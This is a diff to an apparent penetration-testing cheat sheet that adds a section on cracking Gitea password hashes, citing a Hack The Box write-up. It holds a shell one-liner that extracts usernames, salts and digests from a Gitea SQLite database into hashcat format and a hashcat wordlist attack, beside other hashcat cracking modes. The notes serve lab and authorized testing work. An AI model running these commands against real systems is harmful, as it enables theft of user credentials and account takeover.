@@ -305,6 +305,18 @@ $ hashcat -m 18200 -a 0 <FILE> <FILE>
 $ hashcat -m 13100 --force <FILE> <FILE>
 ```
 
+### Cracking Gitea Hashes
+
+> https://0xdf.gitlab.io/2024/12/14/htb-compiled.html#crack-gitea-hash
+
+```c
+$ sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes
+```
+
+```c
+$ hashcat gitea.hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt --user
+```
+
 ### Bruteforce based on the Pattern
 
 ```c
